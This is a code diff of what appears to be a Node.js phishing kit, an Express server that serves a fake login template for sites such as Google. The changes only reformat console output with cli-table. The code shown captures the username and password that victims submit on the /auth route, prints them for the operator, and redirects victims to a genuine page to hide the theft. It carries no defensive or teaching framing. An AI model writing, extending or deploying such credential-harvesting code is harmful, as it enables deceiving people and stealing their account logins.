@@ -4,12 +4,17 @@ const fs = require('fs')
 const session = require('express-session')
 const bodyParser = require('body-parser')
 const path = require('path')
+const Table = require('cli-table')
 const readline = require('readline-sync')
 const { exit } = require('process')
 const fakepass = require('./pass/pased.json')
 const fetch = require('node-fetch')
 const Bluebird = require('bluebird');
+
+// ist
 fetch.Promise = Bluebird
+const recived = new Table()
+const me = new Table()
 
 // colors
 vermelho = '\033[31m'
@@ -77,11 +82,11 @@ app.post('/auth', function(request, response) {
     
     })
 
-    console.log(`\n${verde}Login${negrito} from:${verde} ${siteEscolido}${r}`)
-    console.log(`${verde}User:${negrito} ${user}${r}`)
-    console.log(`${verde}Pass:${negrito} ${pwd}${r}`)
-    console.log('')
-	
+	recived.push(
+		{"User":"Pass"}
+		,{user:pwd}
+	)
+    console.log(recived.toString())
     // fake pass...
     if (siteEscolido == 'Google'){
         response.redirect(fakepass.Google)
@@ -116,10 +121,12 @@ app.get('/vw/:user', (req, res)=> {
 // init server
 app.listen(1337, ()=> {
     console.clear()
-    console.log(`${verde}Tenplate:${negrito}${siteEscolido}${r}`)
-    console.log(`${verde}Author:${negrito} Gab${r}`)
-    console.log(`${verde}Github:${negrito} https://github.com/${negrito}gabhm${r}`)
-    console.log(``)
+    me.push(
+    	{"Template":siteEscolido}
+    	,{"Author":"Gab"}
+    	,{"Github:":" https://github.com/gabhm"}
+    )
+	console.log(me.toString())
     console.log(`${amarelo}WARNING ${negrito} TO ${vermelho}CLOSE${verde}${negrito} THE SERVER, TYPE: CTRL + C !!${r}`)
     most_link()
 })
